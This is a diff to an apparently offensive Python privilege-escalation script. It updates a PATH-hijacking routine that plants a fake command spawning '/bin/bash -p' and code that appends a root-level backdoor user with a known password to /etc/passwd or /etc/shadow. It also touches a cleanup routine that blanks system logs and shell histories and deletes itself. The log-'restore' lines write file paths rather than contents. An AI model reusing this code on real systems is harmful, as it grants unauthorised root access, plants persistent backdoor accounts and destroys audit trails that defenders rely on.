@@ -199,14 +199,14 @@ def path():
             split_path = line.split("/")
             split_path_1 = split_path[-1].strip()
             print(line)
-            if split_path_1 = "snap-confine":
+            if split_path_1 == "snap-confine":
                 continue
             else:
                 os.system("strings {} > /tmp/.path/root_{}".format(line,split_path_1))
                 with open("/tmp/.path/root_{}".format(split_path_1)) as strings_file:
                     lines_strings = strings_file.readlines()
                     for cmd in common_cmds:
-                        non_path_cmd = re.search("\\s{}\\s".format(cmd), lines_strings)
+                        non_path_cmd = re.search("\s{}\s".format(cmd), str(lines_strings))
                         if non_path_cmd:
                             print("### {} does not specify full path of {} ###".format(line,cmd))
                             os.system("touch /tmp/{}&&echo '/bin/bash -p' > /tmp/{}&&chmod +x /tmp/{}&&export PATH=/tmp:$PATH&&.{}".format(cmd,cmd,cmd,line))
@@ -228,44 +228,48 @@ def pass_shadow():
             print("\n### /etc/passwd is writable! creating user 'root1':'password'... ###")
             os.system("echo 'root1:$1$pass$1K/wwgbgGDqTdxG.EHS8F1:0:0:root1:/root:/bin/bash' >> /etc/passwd")
             print("\n### root-group user 'root1':'password' created... :su root1 ###")
+        else:
+            print("\n*** /etc/passwd is not writable ***")
 
     # check if /etc/shadow is writable and if so, add root user
     os.system("ls -l /etc/shadow > /tmp/pwd.txt")
     with open("/tmp/pwd.txt") as shadow:
         perms = shadow.readline()
-        writable = re.search("\\A.......rw|\\A.......-w", shadow)
+        writable = re.search("\\A.......rw|\\A.......-w", str(shadow))
         if writable:
             print("\n### /etc/shadow is writable! creating user 'root1':'password'... ###")
             os.system("echo 'root1:$6$oRWsGKq9s.dB752B$T/8nCxvlSdSo3slqsxwS5m.7j4oR2LUizuSybnfmWwTX79El7SksyK9pEvqbzPM2Q3L0xynmTrXcqWREnSLqu1:18009:0:99999:7:::' >> /etc/shadow")
             print("\n### root-group user 'root1':'password' created... :su root1 ###")
+        else:
+            print("\n*** /etc/shadow is not writable ***")
 
 
 # reestablish history logging and replace log files
 def clear_tracks():
         print("\n### clearing and replacing log files to previous state... ###")
-        os.system("echo ' ' > /var/log/auth.log")
-        os.system("echo ' ' > /var/log/cron.log")
-        os.system("echo ' ' > /var/log/maillog")
-        os.system("echo ' ' > /var/log/httpd")
-        os.system("history -c")
-        os.system("history -w")
-        os.system("echo ' ' > ~/.bash_history")
-        os.system("echo ' ' > /root/.bash_history")
+        os.system("echo ' ' > /var/log/auth.log 2>/dev/null")
+        os.system("echo ' ' > /var/log/cron.log 2>/dev/null")
+        os.system("echo ' ' > /var/log/maillog 2>/dev/null")
+        os.system("echo ' ' > /var/log/httpd 2>/dev/null")
+        os.system("history -c 2>/dev/null")
+        os.system("history -w 2>/dev/null")
+        os.system("echo ' ' > ~/.bash_history 2>/dev/null")
+        os.system("echo ' ' > /root/.bash_history 2>/dev/null")
         os.system("rm -r /tmp/pwd.txt")
 
 		# placing old contents back into logs
-        os.system("echo /tmp/.backups/auth.log > /var/log/auth.log")
-        os.system("echo /tmp/.backups/cron.log > /var/log/cron.log")
-        os.system("echo /tmp/.backups/maillog > /var/log/maillog")
-        os.system("echo /tmp/.backups/httpd > /var/log/httpd")
-        os.system("echo /tmp/.backups/.bash_history > ~/.bash_history")
-        os.system("echo /tmp/.backups/.bash_history > /root/.bash_history")
-        os.system("echo /tmp/.backups/history > $history")
+        os.system("echo /tmp/.backups/auth.log > /var/log/auth.log 2>/dev/null")
+        os.system("echo /tmp/.backups/cron.log > /var/log/cron.log 2>/dev/null")
+        os.system("echo /tmp/.backups/maillog > /var/log/maillog 2>/dev/null")
+        os.system("echo /tmp/.backups/httpd > /var/log/httpd 2>/dev/null")
+        os.system("echo /tmp/.backups/.bash_history > ~/.bash_history 2>/dev/null")
+        os.system("echo /tmp/.backups/.bash_history > /root/.bash_history 2>/dev/null")
+        os.system("echo /tmp/.backups/history > $history 2>/dev/null")
 
         print("\n### deleting script and exiting... ###")
-        os.system("rm -rf /tmp/.backups/")
-        os.system("rm -rf /tmp/.path/")
-        os.system("rm -rf /tmp/*")
+        os.system("rm -rf /tmp/.backups/ 2>/dev/null")
+        os.system("rm -rf /tmp/.path/ 2>/dev/null")
+        os.system("rm -rf /tmp/* 2>/dev/null")
         os.system("rm -f priv.py")
         exit()
 
@@ -276,5 +280,17 @@ sudo_l()
 suid()
 path()
 pass_shadow()
-print("\n-+- welcome, root -+-")
+
+
+# check for root
+def root_check():
+    os.system("id > /tmp/pwd.txt")
+    with open("/tmp/pwd.txt") as check:
+        read_check = check.readline()
+        if "root" in read_check:
+            print("\n-+- welcome, root -+-")
+        else:
+            print("\n-+- no privelege escalation path found... try manually -+-")
+
+
 clear_tracks()
